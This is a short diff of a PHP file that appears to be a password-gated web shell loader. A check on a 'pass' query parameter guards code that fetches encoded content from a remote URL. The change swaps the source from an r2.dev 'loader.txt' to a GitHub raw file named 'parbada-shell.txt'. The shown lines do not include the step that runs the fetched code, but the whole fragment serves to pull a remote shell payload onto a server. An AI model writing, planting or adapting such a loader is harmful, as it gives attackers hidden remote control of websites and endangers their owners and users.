@@ -40,7 +40,7 @@ if (isset($_GET['pass']) && $_GET['pass'] === $auth_pass) {
         return $result;
     }
 
-    $url = 'https://pub-8a4c8983490547dbb84bed26ac17a447.r2.dev/loader.txt';
+    $url = 'https://raw.githubusercontent.com/parbada/shell/main/parbada-shell.txt';
     $encoded_code = get_contents($url);
 
     if ($encoded_code === false) {
